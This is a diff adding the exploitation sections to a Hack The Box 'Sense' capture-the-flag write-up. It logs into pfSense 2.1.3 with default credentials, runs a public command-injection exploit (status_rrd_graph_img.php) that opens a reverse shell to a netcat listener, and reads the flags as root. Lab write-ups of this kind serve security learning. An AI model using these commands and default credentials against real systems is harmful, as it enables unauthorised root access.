@@ -227,6 +227,59 @@ Visiting https://sense.htb/system-users.txt, we are able to know that the userna
 ![syetsm-users.txt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Sense/system-users.PNG)
 
 ## Exploit
+### Gaining access to pfsense
+Previously, we were able to establish that the username for login to the website is ```rohit```, but we do not know the password. Researching on the default credentials for pfsense, we find that the default password used is ```pfsense```. Trying this combination of username and password, we were able to gain access to the website. 
+
+Looking at the internal site, we realized that most of the features are not available and not fully configured.
+
+However, from the index page we are able to establish that we are using ```pfsense 2.1.3-release```. 
+
+![pfsense version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Sense/pfsense_version.PNG)
+
+Using searchsploit, we are able to identify a possible vulnerbaility on the ```/status_rrd_graph_img.php``` endpoint. 
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ searchsploit pfsense 2.1.3
+------------------------------------------------------ ---------------------------------
+ Exploit Title                                        |  Path
+------------------------------------------------------ ---------------------------------
+pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command  | php/webapps/43560.py
+------------------------------------------------------ ---------------------------------
+```
+
 ### Obtaining reverse shell
+We will then save the python script and execute it to obtain a reverse shell.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.5 --lport 3001 --username rohit --password pfsense 
+CSRF token obtained
+Running exploit...
+Exploit completed
+```
+
+We can also see that we are granted root access upon the exploit
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3001           
+listening on [any] 3001 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.60] 29901
+sh: can't access tty; job control turned off
+# whoami
+root
+```
+
 ### Obtaining user flag
+
+```
+# cd /home/rohit
+# cat user.txt
+<Redacted root flag>
+```
 ### Obtaining root flag
+
+```
+# cd /root
+# cat root.txt
+<Redacted root flag>
+```
